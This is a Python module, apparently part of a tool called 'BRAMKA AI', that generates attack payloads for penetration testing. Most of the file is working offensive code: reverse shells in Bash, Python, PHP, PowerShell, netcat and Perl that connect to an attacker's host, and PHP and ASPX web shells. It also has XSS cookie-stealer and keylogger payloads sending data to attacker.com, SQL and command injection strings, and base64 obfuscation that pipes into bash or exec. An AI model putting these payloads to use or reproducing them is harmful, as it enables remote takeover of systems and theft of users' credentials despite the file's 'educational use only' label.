"""
BRAMKA AI - Payload Generator
Professional payload and reverse shell generation for penetration testing
"""

import base64
import urllib.parse
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from enum import Enum

from src.utils.logger import get_logger
from src.utils.config_loader import get_config


class PayloadType(Enum):
    """Types of payloads"""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    WEB_SHELL = "web_shell"
    XSS = "xss"
    SQL_INJECTION = "sql_injection"
    COMMAND_INJECTION = "command_injection"


class ShellLanguage(Enum):
    """Shell script languages"""
    BASH = "bash"
    PYTHON = "python"
    PHP = "php"
    POWERSHELL = "powershell"
    NETCAT = "netcat"
    PERL = "perl"


@dataclass
class Payload:
    """Generated payload"""
    payload_type: str
    language: str
    code: str
    description: str
    encoded: Optional[str] = None
    obfuscated: Optional[str] = None


class PayloadGenerator:
    """
    Professional payload generator for penetration testing
    
    Features:
    - Reverse shell generation (multiple languages)
    - Web shell creation
    - XSS payloads
    - SQL injection payloads
    - Command injection payloads
    - Encoding & obfuscation
    
    ⚠️ EDUCATIONAL USE ONLY - Use on authorized systems only!
    """
    
    def __init__(self):
        self.logger = get_logger("PayloadGenerator")
        self.config = get_config()
        
        # Get payload config
        payload_config = self.config.get('attack_orchestrator.payload_generation', {})
        self.default_lhost = payload_config.get('reverse_shells.lhost', '0.0.0.0')
        self.default_lport = payload_config.get('reverse_shells.lport', 4444)
        self.obfuscation = payload_config.get('malware.obfuscation', True)
        
        self.logger.info("✅ Payload generator initialized")
    
    def generate_reverse_shell(
        self,
        language: ShellLanguage,
        lhost: str,
        lport: int,
        encode: bool = False
    ) -> Payload:
        """
        Generate reverse shell payload
        
        Args:
            language: Programming language for shell
            lhost: Attacker IP (listening host)
            lport: Attacker port (listening port)
            encode: Base64 encode the payload
        
        Returns:
            Payload object
        """
        self.logger.info(f"🔨 Generating {language.value} reverse shell to {lhost}:{lport}")
        
        # Generate payload based on language
        if language == ShellLanguage.BASH:
            code = self._generate_bash_reverse_shell(lhost, lport)
        elif language == ShellLanguage.PYTHON:
            code = self._generate_python_reverse_shell(lhost, lport)
        elif language == ShellLanguage.PHP:
            code = self._generate_php_reverse_shell(lhost, lport)
        elif language == ShellLanguage.POWERSHELL:
            code = self._generate_powershell_reverse_shell(lhost, lport)
        elif language == ShellLanguage.NETCAT:
            code = self._generate_netcat_reverse_shell(lhost, lport)
        elif language == ShellLanguage.PERL:
            code = self._generate_perl_reverse_shell(lhost, lport)
        else:
            raise ValueError(f"Unsupported language: {language}")
        
        # Encode if requested
        encoded = None
        if encode:
            encoded = base64.b64encode(code.encode()).decode()
        
        payload = Payload(
            payload_type=PayloadType.REVERSE_SHELL.value,
            language=language.value,
            code=code,
            description=f"Reverse shell connecting to {lhost}:{lport}",
            encoded=encoded
        )
        
        self.logger.info("✅ Reverse shell payload generated")
        return payload
    
    def _generate_bash_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate Bash reverse shell"""
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    def _generate_python_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate Python reverse shell"""
        return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
    
    def _generate_php_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate PHP reverse shell"""
        return f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""
    
    def _generate_powershell_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate PowerShell reverse shell"""
        return f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """
    
    def _generate_netcat_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate Netcat reverse shell"""
        return f"nc -e /bin/sh {lhost} {lport}"
    
    def _generate_perl_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate Perl reverse shell"""
        return f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
    
    def generate_web_shell(self, language: str = "php") -> Payload:
        """
        Generate web shell
        
        Args:
            language: Script language (php, aspx, jsp)
        
        Returns:
            Payload object
        """
        self.logger.info(f"🔨 Generating {language} web shell")
        
        if language.lower() == "php":
            code = """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>"""
            description = "PHP web shell - Access via ?cmd=command"
        
        elif language.lower() == "aspx":
            code = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    if(Request["cmd"] != null){
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        p.WaitForExit();
    }
}
</script>"""
            description = "ASPX web shell - Access via ?cmd=command"
        
        else:
            raise ValueError(f"Unsupported web shell language: {language}")
        
        payload = Payload(
            payload_type=PayloadType.WEB_SHELL.value,
            language=language,
            code=code,
            description=description
        )
        
        self.logger.info("✅ Web shell generated")
        return payload
    
    def generate_xss_payload(
        self,
        payload_type: str = "basic",
        encode: bool = False
    ) -> Payload:
        """
        Generate XSS payload
        
        Args:
            payload_type: Type of XSS (basic, cookie_stealer, keylogger)
            encode: URL encode the payload
        
        Returns:
            Payload object
        """
        self.logger.info(f"🔨 Generating {payload_type} XSS payload")
        
        if payload_type == "basic":
            code = "<script>alert('XSS')</script>"
            description = "Basic XSS alert"
        
        elif payload_type == "cookie_stealer":
            code = "<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>"
            description = "Cookie stealing XSS"
        
        elif payload_type == "keylogger":
            code = """<script>
document.onkeypress = function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://attacker.com/log.php?key=' + e.key, true);
    xhr.send();
}
</script>"""
            description = "Keylogger XSS"
        
        else:
            raise ValueError(f"Unknown XSS type: {payload_type}")
        
        # URL encode if requested
        encoded = None
        if encode:
            encoded = urllib.parse.quote(code)
        
        payload = Payload(
            payload_type=PayloadType.XSS.value,
            language="javascript",
            code=code,
            description=description,
            encoded=encoded
        )
        
        self.logger.info("✅ XSS payload generated")
        return payload
    
    def generate_sql_injection_payload(
        self,
        injection_type: str = "union"
    ) -> Payload:
        """
        Generate SQL injection payload
        
        Args:
            injection_type: Type of injection (union, boolean, time_based)
        
        Returns:
            Payload object
        """
        self.logger.info(f"🔨 Generating {injection_type} SQL injection payload")
        
        if injection_type == "union":
            code = "' UNION SELECT NULL,NULL,NULL--"
            description = "UNION-based SQL injection"
        
        elif injection_type == "boolean":
            code = "' OR '1'='1"
            description = "Boolean-based SQL injection"
        
        elif injection_type == "time_based":
            code = "' OR SLEEP(5)--"
            description = "Time-based blind SQL injection"
        
        elif injection_type == "error_based":
            code = "' AND 1=CONVERT(int, (SELECT @@version))--"
            description = "Error-based SQL injection"
        
        else:
            raise ValueError(f"Unknown SQL injection type: {injection_type}")
        
        payload = Payload(
            payload_type=PayloadType.SQL_INJECTION.value,
            language="sql",
            code=code,
            description=description
        )
        
        self.logger.info("✅ SQL injection payload generated")
        return payload
    
    def generate_command_injection_payload(
        self,
        command: str = "whoami",
        separator: str = ";"
    ) -> Payload:
        """
        Generate command injection payload
        
        Args:
            command: Command to execute
            separator: Command separator (; | && ||)
        
        Returns:
            Payload object
        """
        self.logger.info(f"🔨 Generating command injection payload")
        
        code = f"{separator} {command}"
        
        payload = Payload(
            payload_type=PayloadType.COMMAND_INJECTION.value,
            language="bash",
            code=code,
            description=f"Command injection executing: {command}"
        )
        
        self.logger.info("✅ Command injection payload generated")
        return payload
    
    def obfuscate_payload(self, payload: Payload) -> Payload:
        """
        Obfuscate payload (basic obfuscation)
        
        Args:
            payload: Payload to obfuscate
        
        Returns:
            Payload with obfuscated code
        """
        if not self.obfuscation:
            return payload
        
        # Basic obfuscation: Base64 encoding
        obfuscated = base64.b64encode(payload.code.encode()).decode()
        
        if payload.language == "bash":
            obfuscated = f"echo {obfuscated} | base64 -d | bash"
        elif payload.language == "python":
            obfuscated = f"python -c 'import base64; exec(base64.b64decode(\"{obfuscated}\"))'"
        
        payload.obfuscated = obfuscated
        self.logger.info("✅ Payload obfuscated")
        
        return payload
    
    def format_payload(self, payload: Payload) -> str:
        """
        Format payload for display
        
        Args:
            payload: Payload object
        
        Returns:
            Formatted string
        """
        output = [
            f"🎯 Generated Payload",
            f"   Type: {payload.payload_type}",
            f"   Language: {payload.language}",
            f"   Description: {payload.description}",
            "",
            "   Code:",
            f"   {payload.code}",
        ]
        
        if payload.encoded:
            output.append(f"\n   Encoded (Base64):\n   {payload.encoded}")
        
        if payload.obfuscated:
            output.append(f"\n   Obfuscated:\n   {payload.obfuscated}")
        
        return '\n'.join(output)


# Testing
def test_payloads():
    """Test payload generator"""
    from src.utils.logger import setup_logger
    
    setup_logger(log_level="INFO")
    
    gen = PayloadGenerator()
    
    print("\n" + "="*60)
    print("Testing Payload Generator")
    print("="*60)
    
    # Test reverse shell
    print("\n1. Bash Reverse Shell:")
    payload1 = gen.generate_reverse_shell(
        ShellLanguage.BASH,
        "10.10.10.10",
        4444
    )
    print(gen.format_payload(payload1))
    
    # Test XSS
    print("\n2. XSS Payload:")
    payload2 = gen.generate_xss_payload("cookie_stealer", encode=True)
    print(gen.format_payload(payload2))
    
    # Test SQL injection
    print("\n3. SQL Injection:")
    payload3 = gen.generate_sql_injection_payload("union")
    print(gen.format_payload(payload3))
    
    print("\n" + "="*60)
    print("✅ All payloads generated successfully")
    print("="*60)


if __name__ == "__main__":
    test_payloads()
